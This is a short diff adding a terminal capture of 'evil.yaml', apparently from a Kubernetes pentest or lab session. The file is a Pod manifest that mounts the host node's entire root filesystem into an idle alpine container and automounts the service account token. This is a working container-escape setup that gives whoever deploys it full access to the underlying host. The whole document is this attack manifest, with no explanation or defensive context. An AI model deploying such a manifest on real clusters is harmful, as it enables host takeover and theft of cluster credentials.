@@ -1,0 +1,22 @@
+evil.yaml
+root@elastic:~/pawn-pod# cat evil.yaml 
+apiVersion: v1
+kind: Pod
+metadata: 
+  name: alpine
+  namespace: dev
+spec: 
+  containers:
+  - name: evil
+    image: alpine
+    command: ["/bin/sh"]
+    args: ["-c", "sleep 300000000"]
+    volumeMounts:
+    - mountPath: /mnt
+      name: hostfs
+  volumes:
+  - name: hostfs
+    hostPath:
+      path: /
+  automountServiceAccountToken: true 
+
